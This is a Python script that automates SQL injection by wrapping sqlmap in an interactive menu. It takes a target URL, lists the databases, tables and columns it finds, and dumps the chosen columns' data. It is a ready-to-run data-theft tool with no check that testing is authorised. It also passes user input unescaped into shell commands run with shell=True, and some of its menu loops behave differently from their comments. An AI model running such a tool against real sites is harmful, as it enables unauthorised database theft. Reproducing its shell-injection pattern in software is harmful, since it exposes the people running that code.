import subprocess
import os

def green_bold(text):
    return f"\033[1;32m{text}\033[0m"

def run_sqlmap(command):
    print(f"\nRunning: {command}\n")
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        print(result)
        return result
    except subprocess.CalledProcessError as e:
        print(e.output)
        return None

def get_databases(url):
    command = f"sqlmap -u '{url}' --batch --dbs"
    result = run_sqlmap(command)
    if result:
        dbs = [line.strip() for line in result.split('\n') if line.strip() and line.strip()[0].isalnum()]
        return dbs
    return []

def get_tables(url, db):
    command = f"sqlmap -u '{url}' --batch -D '{db}' --tables"
    result = run_sqlmap(command)
    if result:
        tables = [line.strip() for line in result.split('\n') if line.strip() and line.strip()[0].isalnum()]
        return tables
    return []

def get_columns(url, db, table):
    command = f"sqlmap -u '{url}' --batch -D '{db}' -T '{table}' --columns"
    result = run_sqlmap(command)
    if result:
        columns = [line.strip() for line in result.split('\n') if line.strip() and line.strip()[0].isalnum()]
        return columns
    return []

def dump_data(url, db, table, columns):
    command = f"sqlmap -u '{url}' --batch -D '{db}' -T '{table}' -C '{columns}' --dump"
    run_sqlmap(command)
ascii_art = '''
             .__                .___                   .__                 
  ___________|  |             __| _/____ ______ ______ |  |   ___________  
 /  ___/ ____/  |    ______  / __ |/  _ \\____ \\____ \|  | _/ __ \_  __ \ 
 \___ < <_|  |  |__ /_____/ / /_/ (  <_> )  |_> >  |_> >  |_\  ___/|  | \/ 
/____  >__   |____/         \____ |\____/|   __/|   __/|____/\___  >__|    
     \/   |__|                   \/      |__|   |__|             \/            
'''
def main():
    print(green_bold((ascii_art).center(50)))
    url = input("Enter target URL: ").strip()

    while True:
        # Step 1: Get Databases
        dbs = get_databases(url)
        if not dbs:
            print("No databases found. Retrying...")
            continue
        print("\nDatabases:")
        for idx, db in enumerate(dbs):
            print(f"{idx + 1}. {db}")
        db_choice = int(input("Select database: ")) - 1
        database = dbs[db_choice]

        while True:
            # Step 2: Get Tables
            tables = get_tables(url, database)
            if not tables:
                print("No tables found. Retrying...")
                continue
            print("\nTables:")
            for idx, table in enumerate(tables):
                print(f"{idx + 1}. {table}")
            table_choice = int(input("Select table: ")) - 1
            table = tables[table_choice]

            while True:
                # Step 3: Get Columns
                columns = get_columns(url, database, table)
                if not columns:
                    print("No columns found. Retrying...")
                    continue
                print("\nColumns:")
                for idx, column in enumerate(columns):
                    print(f"{idx + 1}. {column}")
                column_choice = input("Enter column names to dump (comma separated): ").strip()

                # Step 4: Dump Data
                dump_data(url, database, table, column_choice)

                # Step 5: Next step
                print("\nWhat next?")
                print("0. Exit")
                print("1. Show databases")
                print("2. Show tables of current database")
                next_step = input("Choice: ").strip()
                if next_step == "0":
                    print("Exiting...")
                    return
                elif next_step == "1":
                    break  # go back to database selection
                elif next_step == "2":
                    continue  # repeat table selection
                else:
                    print("Invalid choice, exiting.")
                    return

if __name__ == "__main__":
    main()
